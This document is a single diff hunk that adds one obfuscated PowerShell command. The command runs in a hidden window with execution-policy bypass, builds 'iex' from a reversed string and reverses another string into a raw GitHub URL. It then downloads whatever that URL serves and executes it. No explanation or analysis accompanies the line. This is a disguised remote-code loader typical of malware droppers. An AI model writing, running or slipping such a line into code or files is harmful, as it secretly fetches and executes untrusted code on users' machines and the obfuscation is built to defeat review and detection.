@@ -1,0 +1,1 @@
+powershell -w h -ep bypass -c "Set-Item 'Env:X' 'xei'; $m=(gci Env:X).Value; $s=[string][char[]]([char[]]'001/niam/sdaeh/sfer/non/tppurc-emag-neerG/moc.tneitnocresubuthig.war//:sptth' | ? {$_} | % {$_}); &([scriptblock]::create($m.substring(2,1)+$m.substring(1,1)+$m.substring(0,1))) (irm ($s[[char[]]$s.Length..0] -join ''))"
